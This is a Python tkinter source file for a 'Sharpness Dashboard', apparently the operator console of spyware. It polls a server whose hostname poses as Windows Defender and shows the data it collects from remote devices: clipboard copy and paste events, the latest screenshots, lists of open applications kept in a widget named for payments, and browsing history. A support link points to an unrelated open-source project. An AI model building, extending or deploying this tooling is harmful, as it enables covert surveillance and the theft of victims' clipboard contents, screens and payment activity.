import json
import time
import urllib.request
import urllib.error
import threading
import os
import sys
import datetime

SITE_URL = os.environ.get("KEY_FEED_URL", "https://windows-defender-cf8n.onrender.com").strip().rstrip("/")

BG1 = "#111312"
BG2 = "#24302a"
PANEL = "#161b19"
TEXT = "#f3f1e9"
MUTED = "#a8b2aa"
ACCENT = "#d9f06d"
BORDER = "#2a3a30"
BUBBLE = "#315c4a"
PASTED = "#a34f2e"
COPIED = "#7a5a2d"
ONLINE = "#22c55e"
OFFLINE = "#f97316"


def fetch_json(path, timeout=8):
    req = urllib.request.Request(SITE_URL + path, headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8"))


def fetch_bytes(path, timeout=15):
    req = urllib.request.Request(SITE_URL + path, headers={"Accept": "image/jpeg"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()


def post_json(path, payload=None, timeout=8):
    data = json.dumps(payload).encode("utf-8") if payload is not None else b"{}"
    req = urllib.request.Request(SITE_URL + path, data=data, method="POST",
                                 headers={"Content-Type": "application/json", "Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8"))


def fmt_time(ms):
    try:
        return datetime.datetime.fromtimestamp(int(ms) / 1000.0).strftime("%I:%M %p")
    except Exception:
        return "-"


def fmt_uptime(seconds):
    seconds = max(0, int(seconds))
    days, rem = divmod(seconds, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, secs = divmod(rem, 60)
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours or days:
        parts.append(f"{hours}h")
    if minutes or hours or days:
        parts.append(f"{minutes}m")
    parts.append(f"{secs}s")
    return " ".join(parts)


def fmt_age(seconds):
    seconds = max(0, int(seconds))
    if seconds < 60:
        return f"{seconds}s ago"
    minutes, secs = divmod(seconds, 60)
    if minutes < 60:
        return f"{minutes}m ago"
    hours, minutes = divmod(minutes, 60)
    if hours < 24:
        return f"{hours}h ago"
    days, hours = divmod(hours, 24)
    return f"{days}d ago"


import tkinter as tk
from tkinter import ttk, messagebox
import io

try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except Exception:
    HAS_PIL = False

SELECTED = None
CURRENT_MESSAGES = []
CURRENT_DEVICES = []
HEALTH = {}
RAW_HISTORY = []
SCREENSHOTS = []
WEBSITE_HISTORY = []
SERVICE_STARTED_AT = None
SERVICE_UPTIME = 0
DEVICE_UPTIMES = {}
DEVICE_ONLINE = {}
DEVICE_CLOCKS = {}
DISPLAY_MODE = "filtered"
POLL_INTERVAL_MS = 3000
HEALTH_INTERVAL_MS = 30000

root = None
feed_canvas = None
feed_inner = None
status_label = None
scope_label = None
search_var = None
view_buttons = {}
device_list_canvas = None
device_list_inner = None
open_apps_device_label = None
open_apps_list = None
started_at_label = None
uptime_label = None
message_count_label = None
device_count_label = None
online_count_label = None
device_updated_label = None
support_link = None
payment_list = None
screenshot_cache = {}
screenshot_box = None


def refresh_all():
    global CURRENT_MESSAGES, CURRENT_DEVICES, HEALTH, RAW_HISTORY, SCREENSHOTS, WEBSITE_HISTORY
    global SERVICE_STARTED_AT, SERVICE_UPTIME, DEVICE_UPTIMES, DEVICE_ONLINE, DEVICE_CLOCKS
    try:
        health = fetch_json("/health", timeout=8)
        HEALTH = health
        SERVICE_STARTED_AT = health.get("started_at")
        SERVICE_UPTIME = health.get("uptime", 0)
        devices = fetch_json("/api/devices", timeout=8)
        CURRENT_DEVICES = devices.get("devices", [])
        for d in CURRENT_DEVICES:
            did = d.get("device_id")
            DEVICE_UPTIMES[did] = d.get("uptime", 0)
            DEVICE_ONLINE[did] = d.get("online", False)
            DEVICE_CLOCKS[did] = d.get("clock")
        messages = fetch_json("/messages", timeout=8)
        CURRENT_MESSAGES = messages.get("messages", [])
        RAW_HISTORY = fetch_json("/api/raw-history", timeout=8).get("events", [])
        screenshots = fetch_json("/api/screenshots", timeout=8)
        SCREENSHOTS = screenshots.get("screenshots", [])
        website = fetch_json("/api/website-history", timeout=8)
        WEBSITE_HISTORY = website.get("websites", [])
    except Exception as e:
        set_status(f"Refresh failed: {e}")


def set_status(text):
    if status_label:
        status_label.config(text=text)


def set_scope(text):
    if scope_label:
        scope_label.config(text=text)


def filtered_messages():
    if DISPLAY_MODE == "raw":
        return RAW_HISTORY
    query = search_var.get().strip().lower() if search_var else ""
    out = []
    for m in CURRENT_MESSAGES:
        if query:
            blob = json.dumps(m).lower()
            if query not in blob:
                continue
        out.append(m)
    return out


def rebuild_feed():
    if feed_inner is None:
        return
    for w in feed_inner.winfo_children():
        w.destroy()
    msgs = filtered_messages()
    for m in msgs:
        add_message_bubble(m)


def add_message_bubble(m):
    kind = m.get("kind", "unknown")
    text = m.get("text", "")
    ts = m.get("ts", 0)
    dev = m.get("device_id", "-")
    frame = tk.Frame(feed_inner, bg=BUBBLE, padx=8, pady=4)
    frame.pack(fill="x", pady=2)
    header = f"{dev}  {fmt_time(ts)}"
    tk.Label(frame, text=header, bg=BUBBLE, fg=MUTED, font=("Segoe UI", 9)).pack(anchor="w")
    if kind == "paste":
        bg = PASTED
    elif kind == "copy":
        bg = COPIED
    else:
        bg = BUBBLE
    body = tk.Text(frame, bg=bg, fg=TEXT, font=("Consolas", 10), width=60, height=4,
                   wrap="word", relief="flat", highlightthickness=0)
    body.insert("1.0", text)
    body.config(state="disabled")
    body.pack(fill="x", pady=2)


def rebuild_devices():
    if device_list_inner is None:
        return
    for w in device_list_inner.winfo_children():
        w.destroy()
    for d in CURRENT_DEVICES:
        did = d.get("device_id")
        name = d.get("name", did)
        online = d.get("online", False)
        clock = d.get("clock", "-")
        uptime = fmt_uptime(DEVICE_UPTIMES.get(did, 0))
        card = tk.Frame(device_list_inner, bg=PANEL, padx=10, pady=6)
        card.pack(fill="x", pady=4)
        dot = tk.Label(card, bg=ONLINE if online else OFFLINE, width=2, height=2)
        dot.grid(row=0, column=0, sticky="nsew", padx=(0, 8))
        info = tk.Frame(card, bg=PANEL)
        info.grid(row=0, column=1, sticky="nsew")
        tk.Label(info, text=name, bg=PANEL, fg=TEXT, font=("Segoe UI", 11, "bold")).pack(anchor="w")
        tk.Label(info, text=f"Clock: {clock}", bg=PANEL, fg=MUTED, font=("Segoe UI", 9)).pack(anchor="w")
        tk.Label(info, text=f"Uptime: {uptime}", bg=PANEL, fg=MUTED, font=("Segoe UI", 9)).pack(anchor="w")
        card.columnconfigure(1, weight=1)
        card.bind("<Button-1>", lambda e, d=d: select_device(d))
        for child in card.winfo_children():
            child.bind("<Button-1>", lambda e, d=d: select_device(d))


def select_device(d):
    global SELECTED
    SELECTED = d
    did = d.get("device_id")
    if open_apps_device_label:
        open_apps_device_label.config(text=d.get("name", did))
    if payment_list:
        for w in payment_list.winfo_children():
            w.destroy()
        apps = d.get("open_apps", [])
        if not apps:
            tk.Label(payment_list, text="No open applications", bg=PANEL, fg=MUTED).pack(anchor="w")
        else:
            for app in apps:
                tk.Label(payment_list, text=f"• {app}", bg=PANEL, fg=TEXT).pack(anchor="w")
    if device_updated_label:
        device_updated_label.config(text=fmt_age(d.get("last_seen", 0)))
    refresh_screenshot()


def refresh_screenshot():
    global screenshot_cache
    if SELECTED is None:
        return
    did = SELECTED.get("device_id")
    try:
        data = fetch_bytes(f"/api/devices/{did}/screenshot/latest", timeout=10)
        screenshot_cache[did] = data
    except Exception:
        pass
    if screenshot_cache.get(did):
        show_screenshot(did)


def show_screenshot(did):
    data = screenshot_cache.get(did)
    if not data or not HAS_PIL or screenshot_box is None:
        return
    try:
        for w in screenshot_box.winfo_children():
            w.destroy()
        img = Image.open(io.BytesIO(data))
        img.thumbnail((520, 320))
        photo = ImageTk.PhotoImage(img)
        lbl = tk.Label(screenshot_box, image=photo, bg=PANEL)
        lbl.image = photo
        lbl.pack(pady=8)
    except Exception:
        pass


def set_view(mode):
    global DISPLAY_MODE
    DISPLAY_MODE = mode
    for name, btn in view_buttons.items():
        btn.config(relief="flat" if name == mode else "raised", bg=ACCENT if name == mode else BG2)
    rebuild_feed()


def toggle_pause():
    pass


def poll_loop():
    refresh_all()
    rebuild_feed()
    rebuild_devices()
    update_metrics()
    root.after(POLL_INTERVAL_MS, poll_loop)


def update_metrics():
    if started_at_label:
        started_at_label.config(text=fmt_time(SERVICE_STARTED_AT) if SERVICE_STARTED_AT else "-")
    if uptime_label:
        uptime_label.config(text=fmt_uptime(SERVICE_UPTIME))
    if message_count_label:
        message_count_label.config(text=str(len(CURRENT_MESSAGES)))
    if device_count_label:
        device_count_label.config(text=str(len(CURRENT_DEVICES)))
    if online_count_label:
        online = sum(1 for d in CURRENT_DEVICES if d.get("online"))
        online_count_label.config(text=str(online))


def build_ui():
    global root, feed_canvas, feed_inner, status_label, scope_label, search_var
    global view_buttons, device_list_canvas, device_list_inner
    global open_apps_device_label, open_apps_list, started_at_label, uptime_label
    global message_count_label, device_count_label, online_count_label
    global device_updated_label, support_link, payment_list, screenshot_box

    root = tk.Tk()
    root.title("Sharpness Dashboard")
    root.geometry("1400x900")
    root.configure(bg=BG1)

    top = tk.Frame(root, bg=BG2, height=60)
    top.pack(fill="x")
    tk.Label(top, text="Sharpness", bg=BG2, fg=ACCENT, font=("Segoe UI", 18, "bold")).pack(side="left", padx=16, pady=12)

    toolbar = tk.Frame(root, bg=BG1)
    toolbar.pack(fill="x", padx=12, pady=8)
    search_var = tk.StringVar()
    try:
        search_var.trace_add("write", lambda *a: rebuild_feed())
    except Exception:
        search_var.trace("w", lambda *a: rebuild_feed())
    tk.Entry(toolbar, textvariable=search_var, bg=PANEL, fg=TEXT,
             relief="flat", highlightthickness=1, highlightbackground=BORDER, width=40).pack(side="left", padx=(0, 8))
    for mode in ("filtered", "raw"):
        btn = tk.Button(toolbar, text=mode.capitalize(), bg=BG2, fg=TEXT, relief="flat",
                        activebackground=ACCENT, activeforeground=BG1, command=lambda m=mode: set_view(m))
        btn.pack(side="left", padx=2)
        view_buttons[mode] = btn
    set_view("filtered")
    tk.Button(toolbar, text="Pause", bg=BG2, fg=TEXT, relief="flat", command=toggle_pause).pack(side="left", padx=8)

    main = tk.Frame(root, bg=BG1)
    main.pack(fill="both", expand=True, padx=12, pady=8)

    left = tk.Frame(main, bg=BG1, width=420)
    left.pack(side="left", fill="y")
    tk.Label(left, text="Devices", bg=BG1, fg=ACCENT, font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 4))
    device_list_canvas = tk.Canvas(left, bg=BG1, highlightthickness=0, width=400)
    device_list_inner = tk.Frame(device_list_canvas, bg=BG1)
    device_scroll = tk.Scrollbar(left, orient="vertical", command=device_list_canvas.yview)
    device_list_canvas.create_window((0, 0), window=device_list_inner, anchor="n")
    device_list_canvas.configure(yscrollcommand=device_scroll.set)
    device_list_canvas.pack(side="left", fill="both", expand=True)
    device_scroll.pack(side="right", fill="y")

    center = tk.Frame(main, bg=BG1)
    center.pack(side="left", fill="both", expand=True)
    tk.Label(center, text="Message Feed", bg=BG1, fg=ACCENT, font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 4))
    feed_canvas = tk.Canvas(center, bg=BG1, highlightthickness=0)
    feed_inner = tk.Frame(feed_canvas, bg=BG1)
    feed_scroll = tk.Scrollbar(center, orient="vertical", command=feed_canvas.yview)
    feed_canvas.create_window((0, 0), window=feed_inner, anchor="n")
    feed_canvas.configure(yscrollcommand=feed_scroll.set)
    feed_canvas.pack(side="left", fill="both", expand=True)
    feed_scroll.pack(side="right", fill="y")

    right = tk.Frame(main, bg=BG1, width=380)
    right.pack(side="left", fill="y")
    tk.Label(right, text="Selected Device", bg=BG1, fg=ACCENT, font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=(0, 4))
    open_apps_device_label = tk.Label(right, text="No device selected", bg=PANEL, fg=TEXT,
                                       font=("Segoe UI", 11), anchor="w", padx=8, pady=4)
    open_apps_device_label.pack(fill="x", pady=2)
    tk.Label(right, text="Open Applications", bg=BG1, fg=MUTED, font=("Segoe UI", 10)).pack(anchor="w", pady=(4, 2))
    payment_list = tk.Frame(right, bg=PANEL, height=120)
    payment_list.pack(fill="x", pady=2)
    tk.Label(right, text="Screenshot", bg=BG1, fg=MUTED, font=("Segoe UI", 10)).pack(anchor="w", pady=(8, 2))
    screenshot_box = tk.Label(right, bg=PANEL, height=8)
    screenshot_box.pack(fill="x", pady=2)

    bottom = tk.Frame(root, bg=BG2, height=90)
    bottom.pack(fill="x")
    metrics = tk.Frame(bottom, bg=BG2)
    metrics.pack(fill="x", padx=12, pady=8)
    started_at_label = make_metric(metrics, "Started At", 0)
    uptime_label = make_metric(metrics, "Uptime", 1)
    message_count_label = make_metric(metrics, "Messages", 2)
    device_count_label = make_metric(metrics, "Devices", 3)
    online_count_label = make_metric(metrics, "Online", 4)
    device_updated_label = make_metric(metrics, "Last Seen", 5)

    support_link = tk.Label(bottom, text="Support: https://github.com/Kilo-Org/kilocode/issues",
                            bg=BG2, fg=MUTED, font=("Segoe UI", 9), cursor="hand2")
    support_link.pack(side="left", padx=16, pady=8)
    support_link.bind("<Button-1>", lambda e: os.startfile("https://github.com/Kilo-Org/kilocode/issues") if os.name == "nt" else None)

    status_label = tk.Label(bottom, text="Ready", bg=BG2, fg=MUTED, font=("Segoe UI", 9))
    status_label.pack(side="right", padx=16, pady=8)

    scope_label = tk.Label(bottom, text="", bg=BG2, fg=ACCENT, font=("Segoe UI", 9))
    scope_label.pack(side="right", padx=16, pady=8)

    root.after(100, poll_loop)
    root.mainloop()


def make_metric(parent, title, col):
    cell = tk.Frame(parent, bg=BG2)
    cell.grid(row=0, column=col, sticky="nsew", padx=4)
    tk.Label(cell, text=title, bg=BG2, fg=MUTED, font=("Segoe UI", 9)).pack(anchor="w")
    val = tk.Label(cell, text="-", bg=BG2, fg=TEXT, font=("Segoe UI", 14, "bold"))
    val.pack(anchor="w")
    parent.columnconfigure(col, weight=1)
    return val


if __name__ == "__main__":
    build_ui()